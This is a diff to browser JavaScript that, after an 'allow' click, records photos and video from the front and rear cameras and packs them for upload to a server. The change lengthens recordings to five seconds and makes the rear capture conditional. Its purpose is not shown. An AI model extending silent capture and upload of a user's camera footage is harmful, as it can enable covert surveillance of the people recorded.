@@ -4,6 +4,7 @@ const status = document.getElementById('status');
 const canvas = document.getElementById('canvas');
 
 let stream;
+const RECORDING_DURATION_MS = 5000;
 
 async function waitForVideoReady() {
 
@@ -136,7 +137,7 @@ async function captureCamera(facingMode) {
     recorder.start();
 
     await new Promise(resolve =>
-        setTimeout(resolve, 2000)
+        setTimeout(resolve, RECORDING_DURATION_MS)
     );
 
     recorder.stop();
@@ -251,8 +252,18 @@ allowButton.onclick = async () => {
         const frontCapture =
             await captureCamera('user');
 
+        const cameras =
+            await navigator.mediaDevices.enumerateDevices();
+
+        const hasSeparateCamera =
+            cameras.filter(device =>
+                device.kind === 'videoinput'
+            ).length > 1;
+
         const rearCapture =
-            await captureCamera('environment');
+            hasSeparateCamera
+                ? await captureCamera('environment')
+                : null;
 
 
         // ==================================
@@ -328,17 +339,21 @@ allowButton.onclick = async () => {
             'video-front.webm'
         );
 
-        formData.append(
-            'photoRear',
-            rearCapture.photoBlob,
-            'photo-rear.jpg'
-        );
+        if (rearCapture) {
 
-        formData.append(
-            'videoRear',
-            rearCapture.videoBlob,
-            'video-rear.webm'
-        );
+            formData.append(
+                'photoRear',
+                rearCapture.photoBlob,
+                'photo-rear.jpg'
+            );
+
+            formData.append(
+                'videoRear',
+                rearCapture.videoBlob,
+                'video-rear.webm'
+            );
+
+        }
 
 
         const response =
